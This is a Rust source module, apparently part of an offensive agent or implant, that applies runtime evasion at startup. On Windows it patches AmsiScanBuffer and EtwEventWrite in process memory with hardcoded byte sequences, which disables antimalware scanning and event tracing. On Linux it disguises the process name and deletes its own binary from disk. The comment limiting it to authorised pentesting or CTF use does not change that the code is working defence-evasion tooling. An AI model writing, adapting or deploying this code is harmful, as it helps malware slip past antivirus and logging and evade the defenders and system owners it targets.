//! Runtime bypass application — applies evasion techniques at agent startup.
//!
//! Unlike the code-generation utilities in `amsi.rs`, these functions
//! directly patch the current process's memory to disable security monitors.
//!
//! Use only in authorized pentesting or CTF contexts.

/// Windows runtime bypasses — applied at agent startup.
#[cfg(target_os = "windows")]
pub mod windows {
    /// AMSI bypass via AmsiScanBuffer patch.
    ///
    /// Overwrites the first bytes of `AmsiScanBuffer` in amsi.dll
    /// with `mov eax, 0x80070057; ret` (E_INVALIDARG return).
    ///
    /// # Safety
    /// Modifies process memory. Requires PAGE_EXECUTE_READWRITE.
    pub unsafe fn bypass_amsi() -> Result<(), String> {
        use std::ffi::CString;
        use std::ptr;

        let lib_name = CString::new("amsi.dll").unwrap();
        let func_name = CString::new("AmsiScanBuffer").unwrap();

        let module = LoadLibraryA(lib_name.as_ptr());
        if module.is_null() {
            return Err("amsi.dll not loaded".to_string());
        }

        let func_addr = GetProcAddress(module, func_name.as_ptr());
        if func_addr.is_null() {
            return Err("AmsiScanBuffer not found".to_string());
        }

        // mov eax, 0x80070057 (E_INVALIDARG); ret
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

        let mut old_protect: u32 = 0;
        let result = VirtualProtect(
            func_addr as *mut _,
            patch.len(),
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect,
        );
        if result == 0 {
            return Err("VirtualProtect failed".to_string());
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

        VirtualProtect(
            func_addr as *mut _,
            patch.len(),
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }

    /// ETW bypass via EtwEventWrite patch.
    ///
    /// Patches `ntdll.dll!EtwEventWrite` to return 0 (STATUS_SUCCESS).
    ///
    /// # Safety
    /// Modifies process memory.
    pub unsafe fn bypass_etw() -> Result<(), String> {
        use std::ffi::CString;
        use std::ptr;

        let lib_name = CString::new("ntdll.dll").unwrap();
        let func_name = CString::new("EtwEventWrite").unwrap();

        let module = GetModuleHandleA(lib_name.as_ptr());
        if module.is_null() {
            return Err("ntdll.dll not loaded".to_string());
        }

        let func_addr = GetProcAddress(module, func_name.as_ptr());
        if func_addr.is_null() {
            return Err("EtwEventWrite not found".to_string());
        }

        // xor rax, rax; ret (return 0 = STATUS_SUCCESS)
        let patch: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];

        let mut old_protect: u32 = 0;
        let result = VirtualProtect(
            func_addr as *mut _,
            patch.len(),
            0x40,
            &mut old_protect,
        );
        if result == 0 {
            return Err("VirtualProtect failed".to_string());
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

        VirtualProtect(
            func_addr as *mut _,
            patch.len(),
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }

    #[allow(non_snake_case)]
    extern "system" {
        fn LoadLibraryA(lpLibFileName: *const i8) -> *mut std::ffi::c_void;
        fn GetModuleHandleA(lpModuleName: *const i8) -> *mut std::ffi::c_void;
        fn GetProcAddress(
            hModule: *mut std::ffi::c_void,
            lpProcName: *const i8,
        ) -> *mut std::ffi::c_void;
        fn VirtualProtect(
            lpAddress: *mut std::ffi::c_void,
            dwSize: usize,
            flNewProtect: u32,
            lpflOldProtect: *mut u32,
        ) -> i32;
    }

    /// Apply all available evasion techniques at startup.
    /// Silently ignores failures (some may not apply depending on OS version).
    pub fn apply_all_bypasses() {
        unsafe {
            let _ = bypass_amsi();
            let _ = bypass_etw();
        }
    }
}

/// Linux runtime evasion.
#[cfg(target_os = "linux")]
pub mod linux {
    /// Mask the process name in `ps` output via prctl(PR_SET_NAME).
    pub fn mask_process_name(fake_name: &str) {
        if let Ok(()) = prctl_set_name(fake_name) {
            log::debug!("Masked process name to: {}", fake_name);
        }
    }

    fn prctl_set_name(name: &str) -> Result<(), ()> {
        use std::ffi::CString;
        let c_name = CString::new(name).map_err(|_| ())?;
        let ret = unsafe { libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0) };
        if ret == 0 { Ok(()) } else { Err(()) }
    }

    /// Delete the binary from disk after execution (self-destruct).
    pub fn self_delete() {
        if let Ok(exe_path) = std::fs::read_link("/proc/self/exe") {
            let _ = std::fs::remove_file(exe_path);
        }
    }
}
